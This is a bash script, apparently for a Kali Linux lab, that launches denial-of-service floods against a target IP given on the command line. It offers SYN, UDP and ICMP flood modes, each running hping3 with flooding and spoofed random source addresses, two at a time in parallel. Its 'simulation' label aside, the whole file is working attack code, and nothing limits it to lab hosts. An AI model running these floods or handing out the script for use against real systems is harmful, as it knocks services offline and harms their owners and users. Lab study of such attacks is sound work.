#!/bin/bash
# DDoS Attack Script (Using distributed hosts)
# For Kali Linux VM (Attacker Machine)

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <attack_type>"
    echo "Attack types: syn, udp, icmp"
    exit 1
fi

TARGET_IP=$1
ATTACK_TYPE=$2

echo "Starting DDoS attack of type $ATTACK_TYPE against $TARGET_IP"
echo "This script simulates attacks from multiple hosts (h1, h2)"

# Define IP addresses of bot hosts (h1, h2)
H1_IP="192.168.20.131"
H2_IP="192.168.20.132"

# Function to SSH into a host and execute an attack command
execute_attack() {
    local host_ip=$1
    local target_ip=$2
    local attack_cmd=$3
    
    echo "Launching attack from $host_ip to $target_ip using: $attack_cmd"
    # In a real setup, you would SSH to the host and run the attack
    # Example: ssh user@$host_ip "$attack_cmd"
    
    # For simulation purposes, we'll just run the attack from the current machine
    eval $attack_cmd
}

case $ATTACK_TYPE in
    syn)
        echo "Launching TCP-SYN Flood attack..."
        attack_cmd_h1="sudo hping3 -S -p 80 --flood -d 120 --rand-source $TARGET_IP"
        attack_cmd_h2="sudo hping3 -S -p 443 --flood -d 120 --rand-source $TARGET_IP"
        
        # Execute attacks from both hosts
        execute_attack $H1_IP $TARGET_IP "$attack_cmd_h1" &
        execute_attack $H2_IP $TARGET_IP "$attack_cmd_h2" &
        ;;
    udp)
        echo "Launching UDP Flood attack..."
        attack_cmd_h1="sudo hping3 --udp -p 53 --flood -d 120 --rand-source $TARGET_IP"
        attack_cmd_h2="sudo hping3 --udp -p 123 --flood -d 120 --rand-source $TARGET_IP"
        
        # Execute attacks from both hosts
        execute_attack $H1_IP $TARGET_IP "$attack_cmd_h1" &
        execute_attack $H2_IP $TARGET_IP "$attack_cmd_h2" &
        ;;
    icmp)
        echo "Launching ICMP Flood attack..."
        attack_cmd_h1="sudo hping3 --icmp --flood -d 120 --rand-source $TARGET_IP"
        attack_cmd_h2="sudo hping3 --icmp --flood -d 120 --rand-source $TARGET_IP"
        
        # Execute attacks from both hosts
        execute_attack $H1_IP $TARGET_IP "$attack_cmd_h1" &
        execute_attack $H2_IP $TARGET_IP "$attack_cmd_h2" &
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        exit 1
        ;;
esac

# Wait for all background processes to finish
wait

echo "DDoS attack completed!"
